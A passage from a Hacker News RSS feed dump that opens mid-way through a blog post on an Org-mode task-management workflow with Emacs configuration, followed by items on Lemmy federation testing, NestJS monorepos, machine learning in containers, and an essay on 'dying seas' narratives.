<p>I use as few TODO keywords as possible but not too few. For example, it is common to use only two states (“TODO” and “DONE”) but this does not align with the principles I mentioned above. I need a state for “open loops” so that I can keep the number of them small. I also need to distinguish a smaller set of “next actions” from all tasks.</p>
<p>So far, I defined these five keywords:</p>
<table>
<thead>
<tr>
<th>TODO Keyword</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TODO</code></td>
<td><strong>Tasks that are not started and not planned.</strong> They could be the backlogs or the GTD’s someday/maybe. These tasks could be converted to <code>NEXT</code> during a review.</td>
</tr>
<tr>
<td><code>NEXT</code></td>
<td><strong>Tasks that are not started but planned to do as soon as I can.</strong>  When there is no actionable <code>PROG</code> (e.g., blocked), I start one of those and convert it to <code>PROG</code>.</td>
</tr>
<tr>
<td><code>PROG</code></td>
<td><strong>Tasks that are working in progress (open loops).</strong> I work on these tasks before starting another <code>NEXT</code> task to avoid too many open loops at any moment.</td>
</tr>
<tr>
<td><code>INTR</code></td>
<td><strong>The tasks that are interruptions.</strong> They are urgent things that I should drop everything else and work on it. For example, production issues.</td>
</tr>
<tr>
<td><code>DONE</code></td>
<td><strong>The tasks that are completed.</strong></td>
</tr>
</tbody>
</table>
<p>This diagram illustrates the transition of those states.</p>
<pre><code>                                 +------+
                                 | INTR |
                                 +------+
                                    |
                                    v
+------+   +------+   +------+   +------+
| TODO |--&gt;| NEXT |--&gt;| PROG |--&gt;| DONE |
+------+   +------+   +------+   +------+
</code></pre><h3 id="22-scheduled-and-deadline">2.2 Scheduled and Deadline</h3>
<p>In the past, I tended to set a date for all tasks. If I want to do A, B, and C on Monday, then I schedule them for Monday. This sounds very intuitive but, in reality, I ended up rescheduling many incompleted tasks at the end of every day. It was not only wasting time but also depressing.</p>
<p>Later, I changed to rely more on the TODO keywords. For example, if a task is still in progress, I keep the state unchanged as <code>PROG</code> instead of rescheduling it every day until it is done. I am now using the “scheduled date” to hide a task until the date I should look at it again. Similar to the snooze feature in Gmail.</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SCHEDULED</code></td>
<td>Hide the task until the scheduled date.</td>
</tr>
<tr>
<td><code>DEADLINE</code></td>
<td>The deadline of the task.</td>
</tr>
</tbody>
</table>
<p>For example, when a <code>PROG</code> task is being blocked, I set the <code>SCHEDULED</code> date to hide it until the date I want to revisit. On the scheduled date, if the task is unblocked, I will remove the <code>SCHEDULED</code> date. If the task is still blocked, I reschedule it again. It acts as the <a href="https://hamberg.no/gtd#the-waiting-for-list">waiting for list</a> in GTD.</p>
<h2 id="3-the-workflow">3 The Workflow</h2>
<p>I customize my org agenda view to drive my daily workflow. The customized agenda view has four sections. From the top to bottom, they are the tasks scheduled today, the <code>INTR</code> tasks, the <code>PROG</code> tasks, and finally the <code>NEXT</code> tasks.</p>
<p><img src="https://whhone.com/img/org-agenda.png" alt="Org Agenda"></p>
<p>My daily workflow goes from the top to the bottom.</p>
<h3 id="31-update-tasks-scheduled-today">3.1 Update Tasks Scheduled Today</h3>
<p>At the beginning of the day, I review the tasks that are scheduled for today. The goal here is not to finish them, but to update or remove the scheduled date so that there is nothing left.</p>
<ol>
<li>If the task is still blocked, reschedule it</li>
<li>If the task could be done in a few minutes, then do it and mark it as <code>DONE</code>.</li>
<li>Otherwise, remove the scheduled date and optionally update the TODO keywords.</li>
</ol>
<p>Removing the scheduled date is the best outcome. It indicates the previous estimation was correct, at least not too early. Rescheduling indicates the previous estimation is inaccurate. I would avoid rescheduling the task to tomorrow indiscriminately and try to make a good estimation to reduce the number of rescheduling.</p>
<h3 id="32-find-the-next-task-to-work-on">3.2 Find the Next Task to Work On</h3>
<p>After reviewing all tasks scheduled for today, it is time to pick a task and do some real works. This step is very straight-forward with the customized agenda view above.</p>
<ol>
<li>Pick an <code>INTR</code> task if there is any.</li>
<li>If there is no <code>INTR</code> task, then pick a <code>PROG</code> task and work on it. If that task is blocked, set a <code>SCHEDULED</code> date to hide it.</li>
<li>If there is no <code>INTR</code> and <code>PROG</code> task, then start a <code>NEXT</code> task.</li>
<li>If there is no task in the agenda view, then review the <code>TODO</code> tasks and convert some to <code>NEXT</code>.</li>
</ol>
<h3 id="33-review-the-system">3.3 Review the System</h3>
<p>The secret of having a system that works in the long-term is regular maintenance. I do it at least once a week. For examples,</p>
<ul>
<li>Promote some tasks from <code>TODO</code> to <code>NEXT</code>. Demote or even delete deprioritized tasks.</li>
<li>Review the <a href="https://whhone.com/posts/daily-journal/">journal</a> and add <code>TODO</code> if something needs follow-up.</li>
<li><a href="https://orgmode.org/manual/Archiving.html">Archive</a> completed tasks and extract to permanent notes<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</li>
</ul>
<h2 id="4-the-configuration">4 The Configuration</h2>
<p>Finally, here is the configuration for the above workflow.</p>
<div><pre><code data-lang="lisp"><span>;; Emacs Easy Customization ("M-x customize") syntax is used.</span>
<span>;; If you prefer using .el files directly, set it with "setq".</span>

<span>;; TODO keywords.</span>
<span>'</span>(org-todo-keywords
  <span>'</span>((<span>sequence</span> <span>"TODO(t)"</span> <span>"NEXT(n)"</span> <span>"PROG(p)"</span> <span>"INTR(i)"</span> <span>"DONE(d)"</span>)))

<span>;; Show the daily agenda by default.</span>
<span>'</span>(org-agenda-span <span>'day</span>)

<span>;; Hide tasks that are scheduled in the future.</span>
<span>'</span>(org-agenda-todo-ignore-scheduled <span>'future</span>)

<span>;; Hide the deadline prewarning prior to scheduled date.</span>
<span>'</span>(org-agenda-skip-deadline-prewarning-if-scheduled <span>'pre-scheduled</span>)

<span>;; Customized view for the daily workflow. (Command: "C-c a n")</span>
<span>'</span>(org-agenda-custom-commands
  <span>'</span>((<span>"n"</span> <span>"Agenda / INTR / PROG / NEXT"</span>
     ((agenda <span>""</span> <span>nil</span>)
      (todo <span>"INTR"</span> <span>nil</span>)
      (todo <span>"PROG"</span> <span>nil</span>)
      (todo <span>"NEXT"</span> <span>nil</span>))
     <span>nil</span>)))
</code></pre></div><section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Thanks for <a href="https://www.reddit.com/r/orgmode/comments/jmf8dw/an_orgmode_workflow_for_task_management/gavkv1r/?context=3">this comment</a> in Reddit. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>There will be another post for Org-Mode note-taking workflow. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

		</div>
		
	</article>
</main>







			</div>
			
		</div>
		
	</div></div>]]>
            </description>
            <link>https://whhone.com/posts/org-mode-task-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081372</guid>
            <pubDate>Fri, 13 Nov 2020 12:01:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stefan Thomas - Future of Micropayments 2020 [Video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081327">thread link</a>) | @jorangreef
<br/>
November 13, 2020 | https://cinnamon.video/watch?v=450111686238536935 | <a href="https://web.archive.org/web/*/https://cinnamon.video/watch?v=450111686238536935">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://cinnamon.video/watch?v=450111686238536935</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081327</guid>
            <pubDate>Fri, 13 Nov 2020 11:54:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lemmy federation is almost ready, but it needs some final testing – dev.lemmy.ml]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081113">thread link</a>) | @schwartzworld
<br/>
November 13, 2020 | https://dev.lemmy.ml/post/42478 | <a href="https://web.archive.org/web/*/https://dev.lemmy.ml/post/42478">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>I went and created an account on the Enterprise (I also created accounts on the other two instances later to test out the interactions). I then subscribed to !main@enterprise.lemmy.ml and !main@voyager.lemmy.ml. On my account page, it shows both communities as just â€œmainâ€�:</p>
<p><img src="https://dev.lemmy.ml/pictrs/image/npoeFlwzRD.png" alt=""></p>
<p>This is somewhat confusing by itself, but there is another problem: both of the links point to !main@enterprise.lemmy.ml, instead of one to Enterprise and one to Voyager.</p>
<p>Another small issue (or is it intentional?): Suppose that Iâ€™m a Voyager user viewing the !main@enterprise.lemmy.ml community. I click on â€œCreate a Postâ€�. I would expect that if I donâ€™t select a different community, itâ€™ll post the post to !main@enterprise.lemmy.ml. But actually, the just â€œmainâ€� community is selected, which means the post will go to !main@voyager.lemmy.ml if I donâ€™t select anything else. (If I select â€œ<a href="http://enterprise.lemmy.ml/main">enterprise.lemmy.ml/main</a>â€� from the community list, it posts there just fine, but itâ€™s confusing and slightly inconvenient to have to select it instead of it being already selected.)</p>
<p>Interactions between Enterprise and DS9 are somewhat odd, but I assume itâ€™s supposed to be that way? (DS9 lists Enterprise as â€œlinked instanceâ€�, but Enterprise doesnâ€™t list DS9 as â€œlinked instanceâ€�. Voyager lists both as â€œlinked instanceâ€�.) Iâ€™ll tell you what I saw anyway:</p>
<ul>
<li>DS9 user can <em>send</em> a message to Enterprise user, i. e. â€œMessage sentâ€� appears to the sender, suggesting that everything went fine â€” but the Enterprise user wonâ€™t receive any message. (In my opinion, it would be better in such cases to have some error message to the sender so that they donâ€™t think their message has been received.) Messaging between Enterprise user and Voyager user, as well as between DS9 user and Voyager user, works just fine.</li>
<li>DS9 user can vote and comment on Enterprise userâ€™s post, as well as post posts, on Voyager instance. But Enterprise user wonâ€™t see these comments, votes and posts. Voyager user will see them.</li>
<li>!main@enterprise.lemmy.ml community looks different when viewed from each of the three instances. Compare (all three pictures sorted by New): <a href="https://dev.lemmy.ml/pictrs/image/SSvmszaJMI.png">from Enterprise</a> (itâ€™s quite odd that the Pingu picture is shown there, because I actually posted it to !main@voyager.lemmy.ml), <a href="https://dev.lemmy.ml/pictrs/image/ZI4Q0lqCij.png">from Voyager</a>, and <a href="https://dev.lemmy.ml/pictrs/image/yZAPgvigxI.png">from DS9</a> (â€œCan see this?â€� post was made by DS9 user, but it isnâ€™t shown to the Voyager user, and the other two posts also are completely differentâ€¦).</li>
</ul>
</div></div></div>]]>
            </description>
            <link>https://dev.lemmy.ml/post/42478</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081113</guid>
            <pubDate>Fri, 13 Nov 2020 11:07:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simplifying back end development with NestJS monorepo]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081012">thread link</a>) | @arauhala
<br/>
November 13, 2020 | https://aito.ai/blog/simplifying-backend-development-with-nestjs-monorepo/ | <a href="https://web.archive.org/web/*/https://aito.ai/blog/simplifying-backend-development-with-nestjs-monorepo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The Aito console is the place where you create and manage your Aito database instances. It lets you create and manage your teams and instances, access your API keys, and manage your payment options. It also is the first step in your Aito journey. As we at Aito want you to have the smoothest experience when using and deploying machine learning applications, it is crucial that Aito console works reliably.</p><p>We continuously develop the console and sometimes old mistakes and decisions surface which causes frustration in our development process. Our initial multi repo structure was definitely one of these. Here’s how we simplified our console development process with NestJS’s monorepo mode.</p><h2>The console architecture</h2><p>The Aito console serves as a bridge between the users and Aito instances. It  consists of many different services, integrations, scripts and libraries. There are several steps before the user's requests reach all the way to the AWS and Aito instance.</p><p>The console contains four main services: the front-end React app, the console server, the customer API, and the provisioning API. Each service has a somewhat clear objective that they fulfil:</p><ul><li>The React front-end app serves the user interface for users to actually use the console and interact with their Aito instances</li><li>The console-server serves the front-end to the users and handles user authentication and sessions. It proxies authenticated requests to the customer API.</li><li>The customer API is the heart of the Aito console. It handles user data, teams, authorization, and subscriptions. Actions that require the creation or modification of Aito instances are handled by the Provisioning API.</li><li>The provisioning API handles the communication between the application logic and AWS where customer Aito instances run.</li></ul><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/monorepo-blog-architecture.png" alt="Aito console architecture"></p></div></div><p>At first, these services had essentially independent code bases and rather than shared code among them, some functionality had duplicate implementations. Because the services were still dependent on one another on the service level, we combined them into one repository which gave us the ability to do coordinated changes to all services with one pull request. Common functionalities started to grow when we made a switch from JavaScript to TypeScript and refactored every back-end service to use NestJS. Suddenly we shared types, configurations, local libraries, and packages between the services which introduced many pain points to the development flow.</p><p>Package management was maybe the biggest one. As each service was managed by their separate package.json file, it was very frustrating to maintain the same versions for every service and if one forgot to do this, very weird bugs occurred that slowed down our work.</p><p>With the local libraries that served common functionalities to every service, the problems were similar. Every time one updated a library, every service needed a new rebuild cycle to ensure that each service was using the same version of the library. This again led to weird bugs that were hard to comprehend. Sometimes the bugs surfaced not until the CI which resulted in loss of time and frustration.</p><p>We started to look for solutions to our problems to save our nerves as our problems were completely unnecessary. <a href="https://github.com/lerna/lerna">Lerna</a> was one of the first ones that came up. It can handle multiple packages with shared node modules, but it also relies on the deployments to the NPM registries, which was not suitable for us as we always use a single version of a package and we have no need to publish our packages separately. We discovered that these shared code libraries such as Lerna and <a href="https://classic.yarnpkg.com/en/docs/workspaces/">Yarn workspaces</a> offered features we did not actually need. Then we found out that NestJS already gave us an option out of the box.</p><h2>NestJS monorepo</h2><p>The monorepo mode supported by NestJS CLI tool promises to manage the dependencies and shared codebases in one workspace. The CLI tool accomplishes this by reorganizing the source code files into multiple sub-directories with shared and app specific tsconfig.json files, using a configuration file that defines the structure for NestJS CLI client. Unlike Lerna, it does not rely on package deployments. On top of that, as we already used NestJS to run our back-end services, we only had a few steps to convert our codebase:</p><ul><li>Combine NestJS applications and shared libraries</li><li>Configure nest-cli.json correctly so everything runs</li><li>Configure CircleCI to run tests and build monorepo applications correctly</li><li>Configure our infrastructure to run monorepo applications</li></ul><p>Combining the applications was a very straightforward process. Each application was moved into apps/ directory and the shared libraries were put under the libs/ directory. After this, we could configure a nest-cli.json file that defines where each application is and how it is run. Our project produced a nest-cli.json that looks something like this:</p><div data-language="json"><pre><code><span>{</span>
  <span>"collection"</span><span>:</span> <span>"@nestjs/schematics"</span><span>,</span>
  <span>"sourceRoot"</span><span>:</span> <span>"apps/mission-control/src"</span><span>,</span>
  <span>"monorepo"</span><span>:</span> <span>true</span><span>,</span>
  <span>"root"</span><span>:</span> <span>"apps/mission-control"</span><span>,</span>
  <span>"compilerOptions"</span><span>:</span> <span>{</span>
    <span>"webpack"</span><span>:</span> <span>false</span><span>,</span>
    <span>"tsConfigPath"</span><span>:</span> <span>"apps/mission-control/tsconfig.app.json"</span>
  <span>}</span><span>,</span>
  <span>"projects"</span><span>:</span> <span>{</span>
    <span>"customer-api"</span><span>:</span> <span>{</span>
      <span>"type"</span><span>:</span> <span>"application"</span><span>,</span>
      <span>"root"</span><span>:</span> <span>"apps/customer-api"</span><span>,</span>
      <span>"entryFile"</span><span>:</span> <span>"main"</span><span>,</span>
      <span>"sourceRoot"</span><span>:</span> <span>"apps/customer-api/src"</span><span>,</span>
      <span>"compilerOptions"</span><span>:</span> <span>{</span>
        <span>"tsConfigPath"</span><span>:</span> <span>"apps/customer-api/tsconfig.app.json"</span>
      <span>}</span>
    <span>}</span><span>,</span>
    <span>"console-server"</span><span>:</span> <span>{</span>
      <span>"type"</span><span>:</span> <span>"application"</span><span>,</span>
      <span>"root"</span><span>:</span> <span>"apps/console-server"</span><span>,</span>
      <span>"entryFile"</span><span>:</span> <span>"main"</span><span>,</span>
      <span>"sourceRoot"</span><span>:</span> <span>"apps/console-server/src"</span><span>,</span>
      <span>"compilerOptions"</span><span>:</span> <span>{</span>
        <span>"tsConfigPath"</span><span>:</span> <span>"apps/console-server/tsconfig.app.json"</span>
      <span>}</span>
    <span>}</span><span>,</span>
    <span>"server"</span><span>:</span> <span>{</span>
      <span>"type"</span><span>:</span> <span>"library"</span><span>,</span>
      <span>"root"</span><span>:</span> <span>"libs/server"</span><span>,</span>
      <span>"entryFile"</span><span>:</span> <span>"index"</span><span>,</span>
      <span>"sourceRoot"</span><span>:</span> <span>"libs/server/src"</span><span>,</span>
      <span>"compilerOptions"</span><span>:</span> <span>{</span>
        <span>"tsConfigPath"</span><span>:</span> <span>"libs/server/tsconfig.lib.json"</span>
      <span>}</span>
    <span>}</span>
    ...
  <span>}</span></code></pre></div><p>With the correct configuration, each application was ready to be run locally. To get everything into production, we needed to reconfigure CircleCI, our CI tool, to run correct commands to test and build every application. Lastly, we configured Heroku to run each application. After that, we had a complete development pipeline that had eliminated our biggest development flow issues.</p><h2>Conclusion</h2><p>With the NestJS monorepo, we definitely succeeded in simplifying our development process. We eliminated unnecessary versioning, and managing packages and libraries. Not counting a few bumps with Heroku, the migration to the monorepo mode was pretty straight forward. The work was mostly just restructuring the code into a structure that is also more manageable. More documentation and information about all of the steps from NestJS would have helped, especially as our team is not very experienced with NestJS platform, but I guess that is the case of every software development project.</p><a href="https://aito.ai/blog">Back to blog list</a></div></div>]]>
            </description>
            <link>https://aito.ai/blog/simplifying-backend-development-with-nestjs-monorepo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081012</guid>
            <pubDate>Fri, 13 Nov 2020 10:46:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Science and Machine Learning in Containers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081001">thread link</a>) | @patrycjaneptune
<br/>
November 13, 2020 | https://neptune.ai/blog/data-science-machine-learning-in-containers | <a href="https://web.archive.org/web/*/https://neptune.ai/blog/data-science-machine-learning-in-containers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <article class="page">
	
<p>When building data science and machine learning powered products the research-development-production workflow is not linear like in traditional software development where the specs are known and problems are (mostly) understood beforehand.&nbsp;</p>



<p>There are lots of trial and error involved, including the test and use of new algorithms, trying new data versions (and managing it), packaging the product for production, end-users views and perspectives, feedback loops, and more. These make managing those projects a challenge.&nbsp;</p>



<p>Isolating the development environment from the production systems is a must if you want to assure that your application will actually work. And so putting your ML model development work inside a (docker) container can really help with:</p>



<ul><li>managing the product development,&nbsp;</li><li>keeping your environments clean (and making it easy to reset it),</li><li>most importantly, moving things from development to production becomes easier.</li></ul>



<p>In this article, we will be discussing the development of Machine Learning (ML) powered products, along with best practices for using containers. We’ll cover the following:</p>



<ul><li>Machine learning iterative processes and dependency</li><li>Version control at all stages</li><li>MLOps vs DevOps</li><li>Need for identical dev and prod environment&nbsp;</li><li>Essentials of Containers (meaning, scope, docker file and docker-compose etc.)</li><li>Jupyter notebook in containers&nbsp;</li><li>Application development with TensorFlow in containers as microservice</li><li>GPU &amp; Docker&nbsp;</li></ul>






<h2>What you need to know</h2>



<p>In order to fully understand the implementation of machine learning projects in containers, you should:</p>



<ul><li>Have a basic understanding of software development with Docker,&nbsp;</li><li>Be able to program in Python,</li><li>Be able to build basic machine learning and deep learning models with TensorFlow or Keras,</li><li>Have deployed at least one machine learning model.&nbsp;</li></ul>



<p>The following links might be useful to get you started if you don’t know Docker, Python or TensorFlow:&nbsp;</p>



<ul><li><a href="https://dev.to/pavanbelagatti/getting-started-with-docker-for-developers-3apo" target="_blank" rel="noreferrer noopener nofollow">Software development with docker</a>&nbsp;</li><li><a href="https://www.python.org/about/gettingstarted/" target="_blank" rel="noreferrer noopener nofollow">Python for beginners</a></li><li><a href="https://machinelearningmastery.com/tensorflow-tutorial-deep-learning-with-tf-keras/" target="_blank" rel="noreferrer noopener nofollow">Deep learning with TensorFlow&nbsp;</a></li></ul>






<h2>Machine learning iterative processes and dependency</h2>



<p>Learning is an iterative process. When a child learns to walk, it goes through a repetitive process of walking, falling, standing, walking, and so on – until it “clicks” and it can confidently walk.&nbsp;</p>



<p>The same concept applies to machine learning, and it’s necessary to ensure that the ML model is capturing the right patterns, characteristics and inter-dependencies from given data.&nbsp;</p>



<p>When you are building an ML-powered product or application,you need to be prepared for the iterative process in this approach, especially with machine learning.&nbsp;</p>



<p>This iterative process is not limited to product design alone, but it covers the entire cycle of product development using machine learning.&nbsp;</p>



<p>The right patterns that the algorithm needs to make right business decisions are always hidden in the data. Data scientists and MLOps teams need to put in a lot of effort to build robust ML systems capable of performing this task.&nbsp;</p>



<p>Iterative processes can be confusing. As a rule of thumb, a typical machine learning workflow should consist of at least the following stages:</p>



<ul><li>Data collection or data engineering</li><li>EDA (Exploratory Data Analysis)</li><li>Data pre-processing</li><li>Feature engineering</li><li>Model training</li><li>Model evaluation</li><li>Model tuning and debugging</li><li>Deployment</li></ul>



<p>For each stage, there is a direct or indirect dependency on other stages.&nbsp;</p>



<p>Here is how I like to view the entire workflow based on levels of system design:</p>



<ul><li><strong>The Model Level (fitting parameters):</strong> assuming that the data has been collected, EDA and basic pre-processing done, the iterative process begins when you have to select the model that fits the problem you are trying to solve. There is no shortcut, you need to iterate through some models to see which works best on your data.</li><li><strong>The Micro Level (tuning hyperparameters):</strong> once you select a model (or set of models), you begin another iterative process at the micro level, with the aim to get the best model hyperparameters.</li><li><strong>The Macro Level (solving your problem):</strong> the first model you build for a problem will rarely be the best possible, even if you tune it perfectly with cross-validation. That’s because fitting model parameters and tuning hyperparameters are only two parts of the entire machine learning problem-solving workflow. At this stage, there is a need to iterate through some techniques for improving the model on the problem you are solving. These techniques include trying other models, or ensembling.</li><li><strong>The Meta Level (improving your data):</strong> While improving your model (or training the baseline) you may see that the data that you are using is of poor quality (for example, mislabeled) or that you need more observation of a certain type (for example, images taken at night). In those situations improving your datasets and/or getting more data becomes very important. You should always keep the dataset as relevant as possible to the problem you are solving.&nbsp;</li></ul>



<p>These iterations will always lead to lots of changes in your system, so version control becomes important for efficient workflow and reproducibility.</p>






<h2>Version control at all stages</h2>



<p>Version control is a system that records changes to a file or set of files over time so that you can recall specific versions later. Because of the iterative processes involved in the development of a ML-powered product, versioning has become crucial to the success of the product, and future maintenance or optimization.&nbsp;</p>



<p>Files in your ML workflow, and systems such as notebooks, datasets, scripting files – they all need versioning.</p>



<p>There are many tools and best practises for versioning these files depending on your team’s preferences. I’ll share what works best for me.&nbsp;</p>



<p>Generally, you will use version control systems such as Git, Apache Subversion (SVC), or Concurrent Version Systems (CVS). But using only one of these systems might not be the best for machine learning projects, because of the kind of files used in the ML workflow. It’s best to add other useful tools for efficient versioning of each file.</p>



<p><strong>Data Versioning:</strong> most companies store data in a database or cloud storage / buckets, like the Amazon S3 bucket or Google Cloud Storage, where data can be pulled when needed.&nbsp;</p>



<p>Pulling a sample to best represent the problem you are trying to solve might be iterative, and it becomes important to version the data used to train a machine learning model.&nbsp;</p>



<p>There is a limit to the volume and size of file you can push to a version control platform and sometimes, the data you will be working with comes in gigabytes, so it’s not the best way to approach this.&nbsp;</p>



<p>With tools like DVC and Neptune, data versioning becomes easier. Below are some useful links to get you started with data version control:</p>



<ul><li><a href="https://docs.neptune.ai/api-reference/neptunecontrib/versioning/data/index.html" target="_blank" rel="noreferrer noopener nofollow">Neptune versioning API doc</a></li><li><a href="https://neptune.ai/vs/dvc" target="_blank" rel="noreferrer noopener nofollow">Using Neptune with DVC</a></li><li><a href="https://dvc.org/doc/start/data-versioning" target="_blank" rel="noreferrer noopener nofollow">DVC&nbsp;</a></li></ul>



<p><strong>Notebook Versioning: </strong>Jupyter, Colab notebooks generate files that may contain metadata, source code, formatted text, and rich media.&nbsp;</p>



<p>Unfortunately, this makes these files poor candidates for conventional version control solutions, which work best with plain text. The problem with these notebooks is that they are human-readable JSON .ipynb files. It is uncommon to edit the JSON source directly because the format is so verbose. It’s easy to forget required punctuation, unbalance brackets like {} and [], and corrupt the file.&nbsp;</p>



<p>More troublesome, Jupyter source code is often littered with cell output stored as binary blobs. Little changes in the notebook, such as rerunning with new data, will look like a significant change in the version control commit logs.&nbsp;</p>



<p>Some built-in solutions to effectively keep track of the file convert the notebook to HTML, or to a Python file. External tools that you can use for this are nbdime, ReviewNB, Jupytext and Neptune, to mention a few.</p>



<p>My choice is Neptune, because it can integrate with Jupyter and JupyterLab as an extension. Version control is just one of Neptune’s features. The team, project, and user management features make this more than a version control tool, but the software’s lightweight footprint may make it a compelling candidate regardless.&nbsp;</p>



<hr>



<p><strong><sup>EDITOR’S NOTE<br></sup></strong><a href="https://docs.neptune.ai/keep-track-of-jupyter-notebooks/index.html#key-features" target="_blank" rel="noreferrer noopener nofollow">Get started with notebook versioning with Neptune</a></p>



<hr>



<p><strong>Your entire project can be versioned using version control systems, and this becomes even easier with containers, which we’ll soon discuss.&nbsp;</strong></p>






<h2>MLOps vs DevOps</h2>



<p>Before we dive into containers for machine learning with TensorFlow, let’s quickly go through the similarities and differences between MLOps and DevOps.&nbsp;</p>



<p>MLOps (Machine Learning Operations) aims to manage the deployment of all types of machine learning (deep learning, federated learning, etc) in large-scale production environments.</p>



<p>DevOps (Development and Operations) is a set of practices that combines software development and IT operations at large scale. It aims to make development cycles shorter, increase deployment velocity, and create dependable releases.</p>



<p><strong>DevOps principles also apply to MLOps</strong>, but there are some aspects of machine learning workloads that require a different focus or implementation.&nbsp;</p>



<p>Having in mind the basic ML workflow we discussed earlier, we can pinpoint the following differences in MLOps and DevOps:</p>



<ol><li><strong>Team Skills:</strong> an MLOps team has research scientists, data scientists, and machine learning engineers who serve the same role as a software engineer in a DevOps team. The ML engineers have the essential skills of a software engineer, combined with data science expertise.&nbsp;</li><li><strong>Development:</strong> DevOps is linear, and MLOps is more experimental in nature. The team needs to be able to manipulate model parameters and data features, and retrain models frequently as the data changes. This requires more complex feedback loops. Also, the team needs to be able to track operations for reproducibility without impeding workflow reusability.&nbsp;</li><li><strong>Testing:</strong> in MLOps, testing requires additional methods beyond what is normally done in …</li></ol></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neptune.ai/blog/data-science-machine-learning-in-containers">https://neptune.ai/blog/data-science-machine-learning-in-containers</a></em></p>]]>
            </description>
            <link>https://neptune.ai/blog/data-science-machine-learning-in-containers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081001</guid>
            <pubDate>Fri, 13 Nov 2020 10:44:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The “Dying Seas” of the Anthropocene]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080998">thread link</a>) | @dnetesn
<br/>
November 13, 2020 | http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene | <a href="https://web.archive.org/web/*/http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>D</span>eclarations that the ocean is dying have become commonplace. We read headlines almost daily telling us that the oceans are choked with plastic, overfished, and rapidly acidifying. Yet even in â€œdying,â€� we are told, the ocean threatens human existence as sea levels rise, sea surface temperatures increase, and commercial fish stocks disappear.&nbsp;</p><p>The ocean has thus become emblematic both of a natural world victimized by humanity and of natureâ€™s possible vengeance. In a 2014 video by the nonprofit organization Conservation International, the growling baritone of the actor Harrison Ford speaks for the ocean: â€œI give. They take. But I can always take back.â€�&nbsp; The message is powerful because it conjures images of both the primordial sea as crucible of life and the biblical flood—destruction of life as punishment for human sin. Yet a vengeful ocean is but one of several historical depictions of the sea, some of which have gained prominence at particular moments while others have faded away. In the 1960s and 1970s many scientists, engineers, and policy makers approached the ocean as a vast but resistant reservoir of untapped natural resources. The hostility of the ocean was understood in the context of national calls for increasing exploitation. US Rear Admiral William C. Hushing, for example, in 1967 described the ocean as â€œhostile in almost every way you can think.â€� In Hushingâ€™s view, the task set for â€œManâ€� was â€œto train himself for the hostilityâ€� and eventually â€œfind ways to convert the hostility to friendliness.â€�&nbsp;</p>
<p>Today, the ocean is increasingly cast as fragile, even as dying. And while the ocean voiced by Harrison Ford remains threatening, the message is that humans are responsible for that threat. We, not the ocean, have taken too much. Once we recognize the increasing dominance of a conception of the ocean as fragile and dying, we are prompted to ask how this shapes conservation efforts and whether it has a net positive or negative influence on marine environmental protection. In the fall of 2016, for example, <em>Outside Magazine </em>published an obituary for the Great Barrier Reef. The article quickly went viral, but coral reef scientists condemned the story as irresponsible. The Great Barrier Reef, they pointed out, although under severe threat, was not yet dead. To declare it lifeless was to give up hope. Environmental pessimism comes at a cost. When pseudoscientific claims gain traction, it is often because they appeal to emotions and long-standing narratives already associated with particular environmental spaces.</p>
<p>Dying-seas narratives and imagery may actually hamper communication between scientists and the public. As an example, Jay Cullen, a researcher at the University of Victoria, leads a project to monitor Fukushima radiation in the eastern Pacific. When Cullenâ€™s lab reported that trace radiation was present off the coast of British Columbia but did not represent a significant health hazard, the response was vociferously angry, including death threats aimed at Cullen. In the case of the Fukushima radiation reports, one publicâ€™s response was to reject scientific claims that did not support the narrative of threatening â€œdying seas.â€� To quote the <em>Globe and Mail: </em>â€œDr. Cullen said he frequently hears from people that his science simply canâ€™t be right because the Pacific Ocean is dying. It is adrift with tsunami debris and plastic waste and its stocks have been overfished, but it has not been killed by nuclear radiation.â€�</p>
<blockquote>Hope, like fear, has power to shape the world we will inhabit.</blockquote>
